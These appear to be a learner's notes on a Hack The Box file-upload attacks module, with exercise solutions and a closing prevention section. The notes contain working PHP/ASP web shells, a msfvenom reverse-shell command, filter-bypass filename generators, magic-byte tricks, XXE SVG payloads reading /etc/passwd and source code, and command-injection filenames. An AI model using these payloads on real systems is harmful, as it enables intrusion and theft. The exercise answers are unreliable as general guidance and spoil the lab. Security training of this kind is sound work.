# Intro

## Intro

File uploads are a huge part of current web apps. Many apps allow a profile photo upload, or you might be able to upload documents like PDFs. However with this prevalence comes the risk of potential attacks.

File upload attacks are among the most common found vulnerabilities. And they are usually rated high or critical. Without proper validation, it can be possible to gain remote command execution on a server, or introduce other vulnerabilities. 

# Basic Exploitation

## Absent Validation

The first and most dangerous form of upload vuln, is absent validation. In this form we can upload any file type without restriction. If we cna identify what programming language is being run on the backend server we can possibly gain remote code execution.

One way to determine what language is being run on the backend is to check the index.[file extension] on the current page. We have done this in the past to fuzz for the server type. But this will not always be accurate, as sometimes they web app may not use index pages, or may use more than one web extension.

We can also use something like `https://www.wappalyzer.com/`, which is a browser extension that will tell you the backend server information.

If we do find a web page that seems to have no validation, the first thing we can do is test and see if there is any input validation by running something like `<?php echo "Hello HTB";?>` and visiting the resulting web page to see if it is displayed.

The question in this section is:
Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.

Uploading a file containing:
``` PHP
<?php $var = gethostname(); echo $var;?>
```
Gets the answer.

## Upload Exploitation

After we find a vulnerable web app, we can attempt to get a web shell by uploading a malicious script. One good example of this is `https://github.com/Arrexel/phpbash` which is a php bash script.

But there are many more that we can find in SecLists. If we look in SecLists/Web-Shells we can find lots of web shells for all languages.

There is also a chance that we won't have access to online resources like these (for instance in a pen test), so knowing how to write a basic web shell is good. 

For PHP, uploading a file with:
``` PHP
<?php system($_REQUEST['cmd']); ?>
```
Will give command execution. The system() command runs system commands. And we can pass in a command using a get paramater (e.g. ?cmd=id).

Similarly we can do the same thing in ASP with:
``` ASP
<% eval request('cmd') %>
```

Now lets look at how we can get a reverse shell. First lets get a reverse shell script in PHP from `https://github.com/pentestmonkey/php-reverse-shell`

Once we copy this file over, we need to update the IP to ours and the port to the desired port. 

Then we can start a netcat listener, upload the file, and visit the page and it should work.

Like web shells, reverse shells may not always be easily accessible, and these are less easy to remember. Luckily we can use the msvenom to generate a reverse shell script.

We can generate a reverse shell for php using msvenom like:
`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

Then we can listen with netcat like:
`nc -lvnp OUR_PORT`

The question in this section is:
 Try to exploit the upload feature to upload a web shell and get the content of /flag.txt 

I uploaded the web shell we downloaded above and visited the page.

Then I ran:
```
ls

ls ..

ls ../../

ls ../../../

ls ../../../../

cat ../../../../flag.txt
```

# Bypassing Filters

## Client-Side Validation

Lots of web apps only perform input validation on the front end. However, this is easily bypassed by directly interacting with the server. Or we can modify the front-end code using the browsers dev tools.

If there is front-end validation that we need to deal with, we can intercept the request using Zap or Burp. Then we can select a valid formatted file, and before uploading, change the file to the one we really want. That will allow us to bypass the client-side validation.

The other option for bypassing this validation is to go into the dev tools and inspect the code that is checking the validation. We notice in the example in this section it is simply running a script to validate the extension of the file being uploaded. So we can simply modify this code to either allow our php extension or remove the check entirely.

The question in this seciton is:
Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice) 

To get this I intercepted the upload on Burp and uploaded a file called shell.php with:
`<?php sytem($_REQUEST['cmd']); ?>` in the content.

Then I ran the same set of commands as above and got the answer.

## Blacklist Filters

In this section, it covers how to bypass a blacklist. A blacklist is just a list of things not allowed, and in this example it would be a list of file extensions that are not allowed (e.g. .php, .py, .c, etc). Of course in reality, anyone with a security mindset would use a whitelist if they chose to use anything. But its an interesting exercise none the less.

The section covers how to fuzz the blacklist for allowed extensions. The first thing we want to do is intercept the request and then send it to FUZZ in zap or intruder in Burp. Then we can start fuzzing.

We can use SecLists list of Common Web Extensions located at SecLists/Discovery/WebContent/web-extensions.txt for our fuzz. I used Zap for this, as the free version is not rate-limited for fuzzing.

Once we find some not blacklisted extensions, we can then upload one of those file withs a web shell in the content. Then visit it and do as we please.

The question in this section is:
Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt" 

I ran the fuzz using zap and found a bunch of accepted extensions, including php2, php3, php4, php6.

Uploading a php6 file with the webshell... but the webshell fails.
Same with php4...

I see a .pht file in the list of accepted files.

Looking it up, I see that a .pht file is:
The PHT file stores HTML page that includes a PHP script, dynamically generates HTML, often by accessing database information. PHT seems to be very little used format. These days, you're more likely to see . phtml files

This seems promising. Uploading the shell... doesn't seem to work...
and .phtml doesn't either

I see a .asp file is allowed. I don't think that will work on a php backend... but trying.

Nope doesn't work...

When I re-run the fuzzer with a bigger list of file extensions, I see that pHp5 is allowed. Trying... didn't work.

I was doing this the stupid way. I re-ran the fuzz with the list of extensions in the cheatsheet. Then I reran the fuzz using ?cmd=ls at the end.

I found that .phar was the extension I need.

Then finding the answer was easy.

## Whitelist Filters

This section covers whitelist filters. Specifically, it mentions that a lot of servers will use both a whitelist and blacklist at the same time. Usually this is done with regex such that it defines what file types are allowed. Not what types are not. However, there are vulnerabilities with this too. 

If the developer is not good with regex they might write something like this:
``` PHP
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

This code only verifies that one of the accepted file types is present in the string, not that it ends with that type. So a file like shell.png.php would be accepted.

However, this is not likely to happen as most people will write something like:
``` PHP
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))
```

Which clearly defines the end of the line with $. 

There are also cases when the file upload it self is not vulnerable, but the web server configuration is. For example, the /etc/apache2/mods-enabled/php7.4.conf config file for Apache2 includes the following:
``` xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

This config file determines which files can run PHP, so it allows .phar, .php, and .phtml. However, this regexs pattern has the same mistake as above. In this case, any file with .php, .phtml, etc will be allowed to run. So a file named shell.php.jpg would work.

The last thing it covers is character injection. By injecting certain characters its possilble to have the application misinterpret the filename and execute the uploaded file as PHP.

Some of these characters are:
- %20
- %0a
- %00
- %0d0a
- /
- .\
- .
- …
- :

For example, shell.php%00.jpg works with PHP servers with version 5.X and earlier. It causes the PHP web server to end the file name after %00, and store it as shell.php.

We can run something like:
``` BASH
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
To get all permutations of these file extensions with the added characters.

Then we can run that with Zap or Burp and see if they work.

The question in this section is:
The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

Okay so this one was difficult to figure out. Mostly because I relied on the scripts they provided working out of the box, that was stupid and not something I should have done.

To solve this one, you need to notice that the reverse double extension allows php, AND phar and phtml. When you look at the script provided above it only outputs things for php. So it isn't going to work. But it's easily modified to work.

Then once you upload the files, you can then check allof the uploaded files and see if they return results when you add ?cmd=ls.

I found a script online to do this easily. Its linked in the repository called repeat.sh.

When this is run we find that tmp:.phtml.jpg works. Then we can just run the usual ls directory traversal until we find the flag.

## Type Filters

In this section it covers how to bypass content filters for file upload attacks. There are two main types, the content-type header in the request. An image's content-type header might look like image/jpg.

So if the server is just checking that we can define our content-type to image/jpg and it will pass the filter. However, this is client side and less likely than other checks. Another common check is to check the files MIME type.

MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure. This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes. 

For example, a file with GIF8 as its first 4 bytes will be catagorized as a GIF image, even if it is not. So often times, checks will check these first 4 bytes for the content type.

So if we were trying to circumvent this, we could add something like:
```
GIF8
<?php system($_REQUEST['cmd']); ?>
```
To our intercepted request and it might be uploaded. Even without a file extension change. Of course, a well written web app would also have a blacklist and whitelist on filenames.

The question in this section is:
The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt" 

Running the same attack we did above for the blacklist filter, but adding GIF8 to the start of the payload gets a bunch of successful uploads. wordlist.txt in this directory has all the uploaded payloads.

Then running repeat.sh on the target, and looking for the return content-type of text/html finds a working page.

One of the working pages for me was `http://94.237.62.149:34543/profile_images/tmp.jpg:.phtml?cmd=ls`.

Then getting the flag was easy. There wasn't even an encoding on the space character

# Other Upload Attacks

## Limited File Uploads

In the situation that we cannot bypass the upload filter and just upload any file type we want. We still might be able to upload other file forms that might introduce other vulnerablities.

If we are able to upload html files to the page, we might be able tom introduce XSS vulnerabilities by injecting javascript code into the page. Then we could send a link to someone and use the XSS to steal information.

Or if the web app displays the image metadata after upload, we can add the script at the end of the metadata. 

Finally SVG images can introduce XSS, SVG images are XML-based images, so we can modify the XML data to include our XSS payload.

SVG images are also vulnerable to XXE attacks. For instance, if we cna upload SVG images we can use the following XML to leak /etc/password
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

We could also use this type to read the source code of the PHP Web app like:
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

This is also possible using other formats like: PDF, Word Documents, PowerPoint Documents.

Finally, we can potentially use file uploads for a DoS attack.

One such form of attack woould be a Decompression Bomb. If the upload automatically unzips a ZIP archive, we can potentially upload a file that containing nested ZIP archives within it. This could potentially be petabytes of data, resulting in a crash on the back end server.

Another possible DoS attack is a Pixel Flood attack with some image files that utilize image compression, like JPG or PNG. We can create any JPG image file with any image size (e.g. 500x500), and then manually modify its compression data to say it has a size of (0xffff x 0xffff), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

The questions in this section are:

The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt" 

This one was easy, all I did was upload an .svg file with this in the xml:
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

Then opening the page source had the answer.

Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes) 

Uploading an SVG file with:
``` XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

This returned the source code in base64 encoding. Then passing that value to base64 -d gets the actual source code.

Then you see the name of the directory at the top of the file.

## Other Upload Attacks

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

For example, if we name a file file$(whoami).jpg or file`whoami`.jpg or file.jpg||whoami, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution. You may refer to the Command Injections module for more information.

Similarly, we may use an XSS payload in the file name (e.g. <script>alert(window.origin);</script>), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. file';select+sleep(5);--.jpg), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the Web Attacks/IDOR module discusses various methods of finding where files may be stored and identifying the file naming scheme.

Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.

Similarly, we may try various other techniques to cause the server to error out and disclose the uploads directory, along with additional helpful information.

We can also use a few Windows-Specific techniques in some of the attacks we discussed in the previous sections.

One such attack is using reserved characters, such as (|, <, >, *, or ?), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (CON, COM1, LPT1, or NUL), which may also cause an error as the web application will not be allowed to write a file with this name.

Finally, we may utilize the Windows 8.3 Filename Convention to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (~) to complete the file name, which we can use to our advantage.

For example, to refer to a file called (hackthebox.txt) we can use (HAC~1.TXT) or (HAC~2.TXT), where the digit represents the order of the matching files that start with (HAC). As Windows still supports this convention, we can write a file called (e.g. WEB~.CONF) to overwrite the web.conf file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.

# Prevention

## Prevention

The first and most common type of upload vulnerabilities we discussed in this module was file extension validation. File extensions play an important role in how files and scripts are executed, as most web servers and web applications tend to use file extensions to set their execution properties. This is why we should make sure that our file upload functions can securely handle extension validation.

While whitelisting extensions is always more secure, as we have seen previously, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. shell.php.jpg). The following example shows how this can be done with a PHP web application, but the same concept can be applied to other frameworks

As we have also learned in this module, extension validation is not enough, as we should also validate the file content. We cannot validate one without the other and must always validate both the file extension and its content. Furthermore, we should always make sure that the file extension matches the file's content.

Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded file. It is always recommended to hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page.

We may write a download.php script to fetch the requested file from the uploads directory and then download the file for the end-user. This way, the web application hides the uploads directory and prevents the user from directly accessing the uploaded file. This can significantly reduce the chances of accessing a maliciously uploaded script to execute code.

If we utilize a download page, we should make sure that the download.php script only grants access to files owned by the users (i.e., avoid IDOR/LFI vulnerabilities) and that the users do not have direct access to the uploads directory (i.e., 403 error). This can be achieved by utilizing the Content-Disposition and nosniff headers and using an accurate Content-Type header.

In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database. When the download.php script needs to download a file, it fetches its original name from the database and provides it at download time for the user. This way, users will neither know the uploads directory nor the uploaded file name. We can also avoid vulnerabilities caused by injections in the file names, as we saw in the previous section.

Another thing we can do is store the uploaded files in a separate server or container. If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server. Furthermore, web servers can be configured to prevent web applications from accessing files outside their restricted directories by using configurations like (open_basedir) in PHP.

The above tips should significantly reduce the chances of uploading and accessing a malicious file. We can take a few other measures to ensure that the back-end server is not compromised if any of the above measures are bypassed.

A critical configuration we can add is disabling specific functions that may be used to execute system commands through the web application. For example, to do so in PHP, we can use the disable_functions configuration in php.ini and add such dangerous functions, like exec, shell_exec, system, passthru, and a few others.

Another thing we should do is to disable showing any system or server errors, to avoid sensitive information disclosure. We should always handle errors at the web application level and print out simple errors that explain the error without disclosing any sensitive or specific details, like the file name, uploads directory, or the raw errors.

Finally, the following are a few other tips we should consider for our web applications:

    Limit file size
    Update any used libraries
    Scan uploaded files for malware or malicious strings
    Utilize a Web Application Firewall (WAF) as a secondary layer of protection

Once we perform all of the security measures discussed in this section, the web application should be relatively secure and not vulnerable to common file upload threats. When performing a web penetration test, we can use these points as a checklist and provide any missing ones to the developers to fill any remaining gaps.

# Skill Assessment

## Skills Assessment

The question in this section is:
Try to exploit the upload form to read the flag found at the root directory "/". 


